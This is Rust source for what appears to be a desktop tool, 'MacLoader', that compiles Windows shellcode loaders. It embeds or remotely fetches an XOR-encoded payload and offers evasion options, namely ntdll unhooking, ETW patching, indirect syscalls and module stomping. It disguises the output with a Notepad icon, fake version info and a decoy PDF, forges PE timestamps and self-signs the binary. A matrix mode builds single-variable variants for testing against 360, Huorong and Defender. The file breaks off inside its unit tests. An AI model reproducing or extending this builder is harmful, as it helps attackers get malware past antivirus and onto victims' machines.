fn hexval(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

/// 支持: 原始二进制 | C 源码 "\xNN" | C 数组 "0xNN" | 纯 hex 文本
fn parse_payload(path: &str) -> Result<Vec<u8>, String> {
    let raw = fs::read(path).map_err(|e| format!("读取 payload 失败: {e}"))?;
    if raw.is_empty() {
        return Err("payload 文件为空".into());
    }
    if !looks_text(&raw) {
        return Ok(raw);
    }

    // 第一优先: \xNN 或 0xNN
    let mut out = Vec::with_capacity(raw.len() / 2);
    let mut i = 0usize;
    while i + 3 < raw.len() {
        let p = raw[i];
        let q = raw[i + 1];
        if (p == b'\\' || p == b'0') && (q == b'x' || q == b'X') {
            if let (Some(h), Some(l)) = (hexval(raw[i + 2]), hexval(raw[i + 3])) {
                out.push((h << 4) | l);
                i += 4;
                continue;
            }
        }
        i += 1;
    }

    // 兜底: 纯 hex 文本
    if out.is_empty() {
        let mut hi: Option<u8> = None;
        for &c in &raw {
            if let Some(v) = hexval(c) {
                match hi {
                    None => hi = Some(v),
                    Some(h) => {
                        out.push((h << 4) | v);
                        hi = None;
                    }
                }
            }
        }
    }
    if out.is_empty() {
        return Err("未能从文本中解析出任何字节".into());
    }
    Ok(out)
}

/* ============================ 编译器探测 ============================ */

fn which(name: &str) -> Result<String, ()> {
    let path = std::env::var("PATH").unwrap_or_default();
    for d in path.split(':') {
        if d.is_empty() {
            continue;
        }
        let p = format!("{d}/{name}");
        if Path::new(&p).exists() {
            return Ok(p);
        }
    }
    Err(())
}

fn find_compiler(arch: &str) -> Option<String> {
    let names: &[&str] = if arch == "x86" {
        &["i686-w64-mingw32-g++", "x86_64-w64-mingw32-g++"]
    } else {
        &["x86_64-w64-mingw32-g++", "i686-w64-mingw32-g++"]
    };
    find_tool(names)
}

/* ============================ 数据结构 ============================ */

#[derive(Deserialize, Clone)]
pub struct GenOpts {
    pub payload: String,
    pub out_dir: String,
    pub out_name: String,
    #[serde(default = "d_arch")]
    pub arch: String,
    #[serde(default = "d_enc")]
    pub encoding: String, // auto | uuid | b64 | b32 | chunk | chunk_r | raw
    #[serde(default = "d_true")]
    pub obfuscate: bool, // [B] 编译期代码随机化
    #[serde(default = "d_mode")]
    pub mode: String,
    #[serde(default)]
    pub console: bool,
    #[serde(default)]
    pub xor_key: Option<u32>,
    #[serde(default = "d_load")]
    pub load_mode: String, // embed | remote
    #[serde(default)]
    pub remote_url: String,
    #[serde(default = "d_time")]
    pub time_mode: String, // none | custom | random
    #[serde(default = "d_timeval")]
    pub time_value: String,
    #[serde(default)]
    pub harden: Vec<String>, // unhook | etw | indirect | stomp
    #[serde(default)]
    pub stomp_dll: String,
    #[serde(default = "d_true")]
    pub show_errors: bool,
    #[serde(default = "d_icon")]
    pub icon: String, // "" = 不挂 | "lib:<name>" | 任意 .ico/.png/.jpg 路径
    #[serde(default = "d_true")]
    pub res_full: bool, // 资源伪装: 同时写入 VERSIONINFO + RT_MANIFEST
    #[serde(default)]
    pub decoy: String, // 诱饵 PDF 路径; 非空则启用 PDF 伪装模式
    #[serde(default = "d_true")]
    pub sign: bool, // Authenticode 自签名 (默认开)
    #[serde(default = "d_tsa")]
    pub tsa_url: String,
    // 空串 = 未指定 → 生成时按图标预设自动推导(见 resolve_subject),
    // 以保证签名者与 VERSIONINFO 的 CompanyName 一致。
    #[serde(default)]
    pub cert_subject: String,
    #[serde(default = "d_prot")]
    pub protect: String, // rx(默认) | rwx | auto
    #[serde(default)]
    pub anti_strict: bool, // 反分析遇可疑环境时退出(而非仅记录)
}

fn d_arch() -> String { "x64".into() }
fn d_enc() -> String { "chunk".into() }
fn d_mode() -> String { "direct".into() }
fn d_load() -> String { "embed".into() }
fn d_time() -> String { "random".into() }
fn d_timeval() -> String { "2024-11-15T08:30".into() }
fn d_true() -> bool { true }
fn d_icon() -> String { "lib:notepad".into() }
fn d_tsa() -> String { "http://tsa.wotrus.com".into() }
fn d_subj() -> String { "/C=US/O=Document Viewer/CN=Document Viewer".into() }
fn d_prot() -> String { "rx".into() }

#[derive(Serialize)]
pub struct GenResult {
    pub ok: bool,
    pub log: String,
    pub output: String,
    pub size: u64,
    pub uuid_count: usize,
    pub key: u8,
    pub payload_file: String,
    pub time_ts: u32,
}

#[derive(Serialize)]
pub struct EnvInfo {
    pub x64: String,
    pub x86: String,
    pub windres: String,
    pub openssl: String,
    pub osslsigncode: String,
    pub sips: String,
}

#[derive(Serialize)]
pub struct FileItem {
    pub name: String,
    pub path: String,
    pub size: u64,
    pub mtime: u64,
}

/* ============================ Tauri 命令 ============================ */

#[tauri::command]
fn check_env() -> EnvInfo {
    let nf = "未找到".to_string();
    EnvInfo {
        x64: find_compiler("x64").unwrap_or_else(|| nf.clone()),
        x86: find_compiler("x86").unwrap_or_else(|| nf.clone()),
        windres: find_windres("x64").unwrap_or_else(|| nf.clone()),
        openssl: find_openssl().unwrap_or_else(|| nf.clone()),
        osslsigncode: which("osslsigncode").unwrap_or_else(|_| nf.clone()),
        sips: which("sips").unwrap_or_else(|_| nf.clone()),
    }
}

#[tauri::command]
fn list_icons() -> Vec<String> {
    LIB_ICONS.iter().map(|(n, _)| n.to_string()).collect()
}

#[tauri::command]
async fn pick_file(app: tauri::AppHandle, kind: String) -> Option<String> {
    let dlg = app.dialog().clone();
    let r = if kind == "dir" {
        dlg.file().blocking_pick_folder()
    } else if kind == "icon" {
        dlg.file()
            .add_filter("图标", &["ico", "png", "jpg", "jpeg"])
            .add_filter("所有文件", &["*"])
            .blocking_pick_file()
    } else if kind == "pdf" {
        dlg.file()
            .add_filter("PDF", &["pdf"])
            .add_filter("所有文件", &["*"])
            .blocking_pick_file()
    } else {
        dlg.file()
            .add_filter("payload", &["bin", "raw", "c", "txt"])
            .add_filter("所有文件", &["*"])
            .blocking_pick_file()
    };
    r.and_then(|p| p.into_path().ok())
        .map(|p| p.to_string_lossy().to_string())
}

#[tauri::command]
async fn generate(opts: GenOpts) -> GenResult {
    generate_impl(&opts)
}

fn generate_impl(opts: &GenOpts) -> GenResult {
    let mut log = String::new();
    let fail = |m: String, log: String| GenResult {
        ok: false,
        log: format!("{log}\n[ERROR] {m}"),
        output: String::new(),
        size: 0,
        uuid_count: 0,
        key: 0,
        payload_file: String::new(),
        time_ts: 0,
    };

    // 1. 解析 payload
    let data = match parse_payload(&opts.payload) {
        Ok(d) => d,
        Err(e) => return fail(e, log),
    };
    log.push_str(&format!("[1] payload: {} -> {} bytes\n", opts.payload, data.len()));

    let remote = opts.load_mode == "remote";
    let hs = |n: &str| opts.harden.iter().any(|x| x == n);
    let stomp_on = hs("stomp");
    let stomp_dll: Option<&str> = if stomp_on {
        let d = opts.stomp_dll.trim();
        Some(if d.is_empty() { "winhttp.dll" } else { d })
    } else {
        None
    };
    // stomp 与 rwx/auto 互斥:
    // stomp 把 payload 写进白 DLL 的 .text 后, 第 6 步会对那块内存调
    // VirtualProtect(RWX) —— 改的是"已签名系统模块"的页面属性, 行为上极扎眼,
    // 且可能破坏该 DLL 其它代码页。组合使用既危险又无用, 直接拒绝。
    if stomp_on && opts.protect != "rx" {
        return fail(
            format!(
                "stomp 与 protect={} 互斥: 模块踩踏会改写已签名 DLL 的页面属性, \
                 叠加 RWX/auto 会进一步破坏该模块且行为特征明显。请用 --protect rx 或关闭 stomp",
                opts.protect
            ),
            log,
        );
    }
    if !opts.harden.is_empty() {
        log.push_str(&format!("[2b] 免杀增强: {}\n", opts.harden.join(" + ")));
    }

    // 图标 (可选)
    let mut icon_obj: Option<PathBuf> = None;

    // 2. 编码形态 + 密钥
    let enc_kind: String = match opts.encoding.as_str() {
        "auto" => {
            let pool = ["chunk", "chunk_r"];
            pool[(rand_u64() % pool.len() as u64) as usize].to_string()
        }
        other => other.to_string(),
    };
    let key = match enc_kind.as_str() {
        "raw" => opts.xor_key.map(|k| (k & 0xFF) as u8).unwrap_or(0),
        "chunk" | "chunk_r" => 0u8, // 分块模式每块自带密钥
        _ => opts.xor_key.map(|k| (k & 0xFF) as u8).unwrap_or_else(rand_byte),
    };
    let uuid = enc_kind == "uuid" && !remote;
    log.push_str(&format!(
        "[2] 加载方式 = {} · 编码形态 = {}{}\n",
        if remote { "远程 (URL)" } else { "本地 (内嵌)" },
        enc_kind,
        if opts.encoding == "auto" { " (自动随机)" } else { "" }
    ));
    log.push_str(&format!(
        "    key = 0x{:02X}{} · 代码随机化 = {} · 执行方式 = {}\n",
        key,
        if key == 0 { " (无全局密钥)" } else { "" },
        if opts.obfuscate { "开" } else { "关" },
        opts.mode
    ));

    if remote && opts.remote_url.trim().is_empty() {
        return fail("远程模式必须填写 URL".into(), log);
    }

    // 3. 找编译器
    let cc = match find_compiler(&opts.arch) {
        Some(c) => c,
        None => return fail("未找到 mingw-w64 g++，请先: brew install mingw-w64".into(), log),
    };
    log.push_str(&format!("[3] compiler: {cc}\n"));

    // 4. 输出路径
    let mut out_name = opts.out_name.trim().to_string();
    if out_name.is_empty() {
        out_name = "loader.exe".into();
    }
    if !out_name.to_lowercase().ends_with(".exe") {
        out_name.push_str(".exe");
    }
    let out_dir = if opts.out_dir.trim().is_empty() {
        PathBuf::from(".")
    } else {
        PathBuf::from(opts.out_dir.trim())
    };
    if !out_dir.exists() {
        if let Err(e) = fs::create_dir_all(&out_dir) {
            return fail(format!("创建输出目录失败: {e}"), log);
        }
    }
    let out_exe = out_dir.join(&out_name);

    // 5. 写临时源码
    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let tmp = std::env::temp_dir().join(format!("macloader_{stamp}"));
    if let Err(e) = fs::create_dir_all(&tmp) {
        return fail(format!("创建临时目录失败: {e}"), log);
    }
    let loader_cpp = tmp.join("loader.cpp");
    let embed_cpp = tmp.join("embed_payload.cpp");
    let obf_cpp = tmp.join("obf_random.cpp");
    let (src_code, define) = if remote {
        (
            gen_remote_src(opts.remote_url.trim(), key, stomp_dll),
            "USE_REMOTE".to_string(),
        )
    } else {
        gen_payload_src(&data, key, &enc_kind, stomp_dll)
    };
    if fs::write(&loader_cpp, LOADER_SRC).is_err() || fs::write(&embed_cpp, &src_code).is_err() {
        return fail("写入临时源码失败".into(), log);
    }
    // [B] 代码随机化翻译单元
    if opts.obfuscate {
        if let Err(e) = fs::write(&obf_cpp, gen_random_tu()) {
            return fail(format!("写入随机化源码失败: {e}"), log);
        }
    }
    let uuid_count = if uuid { to_uuids(&data).len() } else { 0 };

    // 4c. 资源: 图标 / 版本信息 / 清单 / 诱饵 PDF
    let decoy_path: Option<&str> = {
        let d = opts.decoy.trim();
        if d.is_empty() { None } else { Some(d) }
    };
    if !opts.icon.trim().is_empty() || decoy_path.is_some() {
        let icon_spec = if opts.icon.trim().is_empty() {
            None
        } else {
            Some(opts.icon.trim())
        };
        match build_res_obj(icon_spec, &tmp, &opts.arch, opts.res_full, decoy_path) {
            Ok(obj) => {
                let mut what: Vec<&str> = Vec::new();
                if icon_spec.is_some() { what.push("图标"); }
                if opts.res_full { what.push("版本信息"); what.push("清单"); }
                if decoy_path.is_some() { what.push("诱饵PDF"); }
                log.push_str(&format!("[4c] 资源: {}\n", what.join(" + ")));
                icon_obj = Some(obj);
            }
            Err(e) => {
                let _ = fs::remove_dir_all(&tmp);
                return fail(format!("资源处理失败: {e}"), log);
            }
        }
    }

    if remote {
        log.push_str(&format!("[4] exe 内嵌 URL: {}\n", opts.remote_url.trim()));
    } else {
        let shape = match enc_kind.as_str() {
            "chunk_r" => "分块变密钥 + 随机倒序",
            "b64" => "Base64 分段 + XOR",
            "b32" => "Base32(自定义字母表) 分段 + XOR",
            "chunk" => "分块变密钥",
            "raw" => "明文数组",
            _ => "UUID + XOR",
        };
        log.push_str(&format!(
            "[4] 内嵌源码已生成 (形态: {}{})\n",
            shape,
            if opts.obfuscate { " · 代码已随机化" } else { "" }
        ));
    }

    // 远程模式: 额外产出"待上传载荷"文件
    let mut payload_file = String::new();
    if remote {
        let stem = Path::new(&out_name)
            .file_stem()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|| "loader".into());
        let pl = out_dir.join(format!("{stem}.payload"));
        let enc: Vec<u8> = if key != 0 {
            data.iter().map(|b| b ^ key).collect()
        } else {
            data.clone()
        };
        if let Err(e) = fs::write(&pl, &enc) {
            return fail(format!("写入待上传载荷失败: {e}"), log);
        }
        payload_file = pl.to_string_lossy().to_string();
        log.push_str(&format!(
            "[4b] 待上传载荷: {} ({} bytes{})\n",
            pl.display(),
            enc.len(),
            if key != 0 { format!(", XOR 0x{key:02X}") } else { String::new() }
        ));
    }

    // 6. 组装编译命令
    let mut args: Vec<String> = vec![
        loader_cpp.to_string_lossy().into(),
        embed_cpp.to_string_lossy().into(),
    ];
    if opts.obfuscate {
        args.push(obf_cpp.to_string_lossy().into());
    }
    if let Some(obj) = &icon_obj {
        args.push(obj.to_string_lossy().into()); // 源/目标文件之后统一追加
    }
    args.push(format!("-D{define}"));
    args.push("-o".into());
    args.push(out_exe.to_string_lossy().into());
    for f in ["-O2", "-w", "-s", "-static", "-static-libgcc", "-static-libstdc++"] {
        args.push(f.into());
    }
    if opts.console {
        args.push("-mconsole".into());
    } else {
        args.push("-mwindows".into());
        args.push("-DGUI_MODE".into());
    }
    if hs("unhook")   { args.push("-DHARDEN_UNHOOK".into()); }
    if hs("etw")      { args.push("-DHARDEN_ETW".into()); }
    if hs("indirect") { args.push("-DHARDEN_INDIRECT".into()); }
    if hs("diskssn")  { args.push("-DHARDEN_DISKSSN".into()); }
    if stomp_on       { args.push("-DHARDEN_STOMP".into()); }
    // 执行方式: 必须编译进宏。此前 mode 只经 argv 传递, 而内嵌 exe 双击时
    // argc==1, 永远落到 direct —— UI 选 fiber/callback 生成的 exe 与 direct
    // 逐字节相同(死选项)。
    match opts.mode.as_str() {
        "fiber"    => args.push("-DMODE_FIBER".into()),
        "callback" => args.push("-DMODE_CALLBACK".into()),
        _          => args.push("-DMODE_DIRECT".into()),
    }
    if opts.show_errors { args.push("-DSHOW_ERRORS".into()); }
    if opts.anti_strict { args.push("-DANTI_STRICT_DEFAULT=1".into()); }
    if decoy_path.is_some() { args.push("-DDECOY_PDF".into()); }
    match opts.protect.as_str() {
        "rwx" => args.push("-DPROT_RWX".into()),
        "auto" => args.push("-DPROT_AUTO".into()),
        _ => {}
    }
    log.push_str(&format!("[5] {cc} {}\n", args.join(" ")));

    // 7. 编译
    let out = Command::new(&cc).args(&args).output();
    match out {
        Ok(o) => {
            if !o.status.success() {
                let err = String::from_utf8_lossy(&o.stderr);
                let _ = fs::remove_dir_all(&tmp);
                return fail(format!("编译失败:\n{err}"), log);
            }
        }
        Err(e) => {
            let _ = fs::remove_dir_all(&tmp);
            return fail(format!("调用编译器失败: {e}"), log);
        }
    }
    if std::env::var("MACLOADER_KEEP").is_ok() {
        log.push_str(&format!("[keep] 中间源码: {}\n", tmp.display()));
    } else {
        let _ = fs::remove_dir_all(&tmp);
    }

    // 7. 创建时间伪造 (改写 PE 头 TimeDateStamp + Debug 目录 + 文件 mtime)
    let mut time_ts = 0u32;
    match opts.time_mode.as_str() {
        "custom" => match parse_datetime(&opts.time_value) {
            Some(ts) => time_ts = ts.max(0) as u32,
            None => log.push_str("[7] 时间格式无法解析 (示例 2024-03-01T10:30), 已跳过\n"),
        },
        "random" => {
            // 固定种子时用固定基准时间, 否则 time_ts 会随系统时钟漂移,
            // 导致"同种子同配置"的两次产物仍然不同。
            let seed_mode = std::env::var("MACLOADER_SEED").is_ok();
            let now = if seed_mode {
                1_760_000_000i64 // 2025-10-09 固定基准
            } else {
                SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .map(|d| d.as_secs() as i64)
                    .unwrap_or(0)
            };
            let span = 730i64 * 86400; // 近两年
            let back = (rand_u64() % span as u64) as i64;
            time_ts = (now - 30 * 86400 - back).max(0) as u32;
        }
        _ => {}
    }
    if time_ts != 0 {
        match patch_pe_timestamp(&out_exe, time_ts) {
            Ok(n) => log.push_str(&format!(
                "[7] PE 时间戳 -> {} (改写 {} 处)\n",
                fmt_ts(time_ts as i64),
                n
            )),
            Err(e) => log.push_str(&format!("[7] PE 时间戳改写失败: {e}\n")),
        }
    }

    // 8. Authenticode 自签名 (必须在改完 PE 时间戳之后, 否则签名作废)
    if opts.sign {
        let sign_name = Path::new(&out_name)
            .file_stem()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|| "Application".into());
        match ensure_cert(&resolve_subject(opts)) {
            Ok((pfx, pass)) => match sign_exe(&out_exe, &pfx, &pass, &sign_name, &opts.tsa_url) {
                Ok(_) => log.push_str(&format!(
                    "[8] 已签名 · 时间戳: {}\n",
                    if opts.tsa_url.trim().is_empty() { "无".to_string() } else { opts.tsa_url.clone() }
                )),
                Err(e) => log.push_str(&format!("[8] 签名失败(已跳过): {e}\n")),
            },
            Err(e) => log.push_str(&format!("[8] 证书准备失败(已跳过): {e}\n")),
        }
    }

    // 9. 文件时间 (放在签名之后, 避免被覆盖)
    if time_ts != 0 {
        match set_file_time(&out_exe, time_ts as i64) {
            Ok(_) => log.push_str("[9] 文件 mtime/atime 已同步\n"),
            Err(e) => log.push_str(&format!("[9] 文件时间设置失败: {e}\n")),
        }
    }

    let size = fs::metadata(&out_exe).map(|m| m.len()).unwrap_or(0);
    log.push_str(&format!("[6] OK -> {} ({} bytes)", out_exe.display(), size));

    GenResult {
        ok: true,
        log,
        output: out_exe.to_string_lossy().to_string(),
        size,
        uuid_count,
        key,
        payload_file,
        time_ts,
    }
}

#[tauri::command]
fn list_dir(dir: String) -> Vec<FileItem> {
    let mut v = Vec::new();
    if let Ok(rd) = fs::read_dir(&dir) {
        for e in rd.flatten() {
            let p = e.path();
            let is_exe = p
                .extension()
                .map(|x| x.eq_ignore_ascii_case("exe"))
                .unwrap_or(false);
            if !is_exe {
                continue;
            }
            let md = e.metadata().ok();
            let size = md.as_ref().map(|m| m.len()).unwrap_or(0);
            let mtime = md
                .as_ref()
                .and_then(|m| m.modified().ok())
                .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            v.push(FileItem {
                name: p.file_name().unwrap_or_default().to_string_lossy().to_string(),
                path: p.to_string_lossy().to_string(),
                size,
                mtime,
            });
        }
    }
    v.sort_by(|a, b| b.mtime.cmp(&a.mtime));
    v
}

#[tauri::command]
fn reveal(path: String) {
    let target = Path::new(&path);
    let dir = if target.is_dir() {
        target.to_path_buf()
    } else {
        target.parent().map(|p| p.to_path_buf()).unwrap_or_default()
    };
    let _ = Command::new("open").arg(dir).spawn();
}

/// 变体矩阵: 一次生成多个 exe, 每个只差一个变量。
///
/// 为什么要这么设计: 免杀调参最大的问题是"一次改一堆, 过了不知道是谁的功劳,
/// 杀了不知道是谁的锅"。矩阵里的每个变体相对基线只动一处, 实测结果就能直接
/// 归因到那个变量。
///
/// 变体的基线 = 命令行上显式给出的参数(这样你能先固定住已知能过的配置)。
fn run_matrix(base: &GenOpts) -> i32 {
    // (后缀, 改动说明, 施加改动的闭包)
    let variants: Vec<(&str, &str, Box<dyn Fn(&mut GenOpts)>)> = vec![
        ("base", "基线: 完全按命令行参数", Box::new(|_| {})),
        ("enc_uuid", "仅改: 编码=uuid", Box::new(|o| o.encoding = "uuid".into())),
        ("enc_b64", "仅改: 编码=b64", Box::new(|o| o.encoding = "b64".into())),
        ("enc_b32", "仅改: 编码=b32", Box::new(|o| o.encoding = "b32".into())),
        ("enc_chunk_r", "仅改: 编码=chunk_r(块随机倒序)", Box::new(|o| o.encoding = "chunk_r".into())),
        ("no_obf", "仅改: 关掉代码随机化", Box::new(|o| o.obfuscate = false)),
        ("mode_fiber", "仅改: 执行方式=fiber", Box::new(|o| o.mode = "fiber".into())),
        ("mode_callback", "仅改: 执行方式=callback", Box::new(|o| o.mode = "callback".into())),
        ("prot_rwx", "仅改: 内存属性=RWX", Box::new(|o| o.protect = "rwx".into())),
        ("prot_auto", "仅改: 内存属性=auto", Box::new(|o| o.protect = "auto".into())),
        ("no_res", "仅改: 去掉版本信息/清单", Box::new(|o| o.res_full = false)),
        ("no_icon", "仅改: 不挂图标", Box::new(|o| o.icon = String::new())),
        ("anti_strict", "仅改: 反分析遇可疑环境退出", Box::new(|o| o.anti_strict = true)),
    ];

    let dir = PathBuf::from(if base.out_dir.trim().is_empty() { "." } else { base.out_dir.trim() });
    if let Err(e) = fs::create_dir_all(&dir) {
        eprintln!("创建输出目录失败: {e}");
        return 1;
    }

    let stem = Path::new(&base.out_name)
        .file_stem()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|| "loader".into());

    println!("[matrix] 基线: enc={} mode={} protect={} obf={} icon={} res={}",
             base.encoding, base.mode, base.protect, base.obfuscate,
             if base.icon.is_empty() { "(无)" } else { &base.icon }, base.res_full);
    println!("[matrix] 输出到 {}", dir.display());
    println!();

    let mut ok = 0usize;
    let mut failed: Vec<String> = Vec::new();
    let mut results: Vec<(String, u64)> = Vec::new();

    for (suffix, desc, apply) in &variants {
        let mut o = base.clone();
        apply(&mut o);
        o.out_dir = dir.to_string_lossy().to_string();
        o.out_name = format!("{stem}_{suffix}.exe");

        // 互斥项在矩阵里会导致失败 —— 单独跳过并说明, 不算错误
        let stomp = o.harden.iter().any(|h| h == "stomp");
        if stomp && o.protect != "rx" {
            println!("  [跳过] {suffix:<14} {desc} (与 stomp 互斥)");
            continue;
        }

        print!("  [生成] {suffix:<14} {desc} ... ");
        let r = generate_impl(&o);
        if r.ok {
            println!("OK {} bytes", r.size);
            ok += 1;
            results.push((suffix.to_string(), r.size));
        } else {
            println!("失败");
            let last = r.log.lines().filter(|l| l.contains("[ERROR]")).last()
                .unwrap_or("(无详情)");
            failed.push(format!("{suffix}: {last}"));
        }
    }

    println!();
    println!("[matrix] 完成: {} 个成功, {} 个失败", ok, failed.len());
    if !failed.is_empty() {
        println!("  失败明细:");
        for f in &failed {
            println!("    {f}");
        }
    }

    // 输出一份待填的测试表, 直接贴给你填结果
    println!();
    println!("[matrix] 测试表 (填 过/杀):");
    println!("{:<16} {:<10} {:<8} {:<8} {:<8}", "变体", "大小", "360", "火绒", "Defender");
    for (suffix, size) in &results {
        println!("{:<16} {:<10} {:<8} {:<8} {:<8}", suffix, size, "", "", "");
    }
    if ok == 0 { 1 } else { 0 }
}

fn main() {
    // 无界面模式: macloader --cli --payload <p> [--out-dir D] [--name F]
    //            [--arch x64|x86] [--encoding chunk|uuid|b64|b32|chunk_r|raw|auto]
    //            [--mode direct|fiber|callback] [--protect rx|rwx|auto]
    //            [--icon lib:notepad|/path] [--decoy x.pdf] [--sign|--no-sign]
    //            [--time random|custom|none] [--time-value ...] [--tsa URL]
    //            [--no-obf] [--no-res] [--console] [--key 0x41]
    let argv: Vec<String> = std::env::args().collect();
    if argv.iter().any(|a| a == "--cli") {
        // 未知参数直接报错退出, 避免"拼错被静默忽略、按默认值出 exe"
        const KNOWN_FLAGS: &[&str] = &[
            "--payload", "--out-dir", "--name", "--arch", "--encoding", "--encrypt",
            "--mode", "--key", "--load", "--url", "--time", "--time-value",
            "--harden", "--stomp-dll", "--icon", "--decoy", "--sign", "--no-sign",
            "--no-obf", "--no-res", "--no-errors", "--console", "--tsa", "--cert-subj",
            "--protect", "--anti-strict", "--matrix",
        ];
        let unknown: Vec<&str> = argv
            .iter()
            .skip(1)
            .filter(|a| {
                a.starts_with("--") && a.as_str() != "--cli" && !KNOWN_FLAGS.contains(&a.as_str())
            })
            .map(|a| a.as_str())
            .collect();
        if !unknown.is_empty() {
            eprintln!("未知参数: {}", unknown.join(" "));
            eprintln!("合法参数: {}", KNOWN_FLAGS.join(" "));
            std::process::exit(2);
        }
        let get = |k: &str| -> Option<String> {
            argv.iter().position(|a| a == k).and_then(|i| argv.get(i + 1)).cloned()
        };
        let opts = GenOpts {
            payload: get("--payload").unwrap_or_default(),
            out_dir: get("--out-dir").unwrap_or_else(|| ".".into()),
            out_name: get("--name").unwrap_or_else(|| "loader.exe".into()),
            arch: get("--arch").unwrap_or_else(d_arch),
            encoding: get("--encoding").or_else(|| get("--encrypt")).unwrap_or_else(d_enc),
            obfuscate: !argv.iter().any(|a| a == "--no-obf"),
            mode: get("--mode").unwrap_or_else(d_mode),
            console: argv.iter().any(|a| a == "--console"),
            xor_key: get("--key").and_then(|v| {
                let v = v.trim().to_lowercase();
                if let Some(h) = v.strip_prefix("0x") {
                    u32::from_str_radix(h, 16).ok()
                } else {
                    v.parse::<u32>().ok()
                }
            }),
            load_mode: get("--load").unwrap_or_else(d_load),
            remote_url: get("--url").unwrap_or_default(),
            time_mode: get("--time").unwrap_or_else(d_time),
            time_value: get("--time-value").unwrap_or_else(d_timeval),
            harden: get("--harden")
                .map(|v| {
                    v.split(',')
                        .map(|s| s.trim().to_string())
                        .filter(|s| !s.is_empty())
                        .collect()
                })
                .unwrap_or_default(),
            stomp_dll: get("--stomp-dll").unwrap_or_default(),
            show_errors: !argv.iter().any(|a| a == "--no-errors"),
            icon: get("--icon").unwrap_or_else(d_icon),
            res_full: !argv.iter().any(|a| a == "--no-res"),
            decoy: get("--decoy").unwrap_or_default(),
            sign: !argv.iter().any(|a| a == "--no-sign"),
            tsa_url: get("--tsa").unwrap_or_else(d_tsa),
            // 未显式指定时, 证书主题按图标预设联动(避免与 VERSIONINFO 的
            // CompanyName 矛盾); 显式给了就尊重用户输入。
            cert_subject: get("--cert-subj")
                .unwrap_or_else(|| preset_subject(&get("--icon").unwrap_or_else(d_icon))),
            protect: get("--protect").unwrap_or_else(d_prot),
            anti_strict: argv.iter().any(|a| a == "--anti-strict"),
        };
        if opts.payload.is_empty() {
            eprintln!("用法: macloader --cli --payload <文件> [--out-dir 目录] [--name 名称] \
                       [--arch x64|x86] [--encoding chunk|uuid|b64|b32|chunk_r|raw|auto] \
                       [--mode direct|fiber|callback] [--protect rx|rwx|auto] \
                       [--icon lib:notepad|路径] [--decoy x.pdf] [--sign|--no-sign] \
                       [--time random|custom|none] [--time-value 2024-03-01T10:30] \
                       [--no-obf] [--no-res] [--console] [--key 0x41]");
            std::process::exit(2);
        }
        // 枚举值校验: 与 UI 下拉框一致, 拼错值即报错而非落入默认形态
        const ARCH: &[&str] = &["x64", "x86"];
        const ENC: &[&str] = &["auto", "uuid", "b64", "b32", "chunk", "chunk_r", "raw"];
        const MODE: &[&str] = &["direct", "fiber", "callback"];
        const LOAD: &[&str] = &["embed", "remote"];
        const TIME: &[&str] = &["none", "custom", "random"];
        const PROT: &[&str] = &["rx", "rwx", "auto"];
        // diskssn: 内存 ntdll 被 hook 时改从磁盘干净副本解析 SSN。
        // 注意: 与 unhook/etw/indirect/stomp 一样, 实测在 360 环境下有触发风险,
        // 保持默认关闭(需显式 --harden diskssn 才启用)。
        const HARDEN: &[&str] = &["unhook", "etw", "indirect", "stomp", "diskssn"];
        let bad = |flag: &str, val: &str, allowed: &[&str]| {
            eprintln!("参数 {flag} 的值无效: {val} (允许: {})", allowed.join("|"));
            std::process::exit(2);
        };
        if !ARCH.contains(&opts.arch.as_str()) { bad("--arch", &opts.arch, ARCH); }
        if !ENC.contains(&opts.encoding.as_str()) { bad("--encoding", &opts.encoding, ENC); }
        if !MODE.contains(&opts.mode.as_str()) { bad("--mode", &opts.mode, MODE); }
        if !LOAD.contains(&opts.load_mode.as_str()) { bad("--load", &opts.load_mode, LOAD); }
        if !TIME.contains(&opts.time_mode.as_str()) { bad("--time", &opts.time_mode, TIME); }
        if !PROT.contains(&opts.protect.as_str()) { bad("--protect", &opts.protect, PROT); }
        for h in &opts.harden {
            if !HARDEN.contains(&h.as_str()) { bad("--harden", h, HARDEN); }
        }
        // --matrix: 一次生成一整组"每次只差一个变量"的 exe, 便于实测后反推
        // 引擎判据。参照 fscan 免杀的做法 —— 人工一个个试参数太慢, 且试出来的
        // 结论无法定位到具体变量。
        if argv.iter().any(|a| a == "--matrix") {
            if opts.payload.is_empty() {
                eprintln!("--matrix 需要 --payload");
                std::process::exit(2);
            }
            std::process::exit(run_matrix(&opts));
        }

        let r = generate_impl(&opts);
        println!("{}", r.log);
        std::process::exit(if r.ok { 0 } else { 1 });
    }

    tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .invoke_handler(tauri::generate_handler![
            check_env,
            list_icons,
            pick_file,
            generate,
            list_dir,
            reveal
        ])
        .run(tauri::generate_context!())
        .expect("MacLoader 启动失败");
}

/* ============================ 单元测试 ============================ */
/* 参考解码器与 loader.cpp 的 b64_decode / b32_decode / uuid_decode 语义一致,
 * 用于在 Rust 侧独立验证各编码器的正确性与往返一致性 */

#[cfg(test)]
mod tests {
    use super::*;

    /* ---- Base64 ---- */

    #[test]
    fn b64_rfc4648_vectors() {
        assert_eq!(b64_encode(b""), "");
        assert_eq!(b64_encode(b"f"), "Zg==");
        assert_eq!(b64_encode(b"fo"), "Zm8=");
        assert_eq!(b64_encode(b"foo"), "Zm9v");
        assert_eq!(b64_encode(b"foob"), "Zm9vYg==");
        assert_eq!(b64_encode(b"fooba"), "Zm9vYmE=");
        assert_eq!(b64_encode(b"foobar"), "Zm9vYmFy");
    }

    fn b64_decode_ref(input: &str) -> Vec<u8> {
        const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut rev = [-1i32; 256];
        for (i, &c) in A.iter().enumerate() {
            rev[c as usize] = i as i32;
        }
        let mut buf = 0u32;
        let mut bits = 0i32;
        let mut out = Vec::new();
        for &c in input.as_bytes() {
            let v = rev[c as usize];
            if v < 0 {
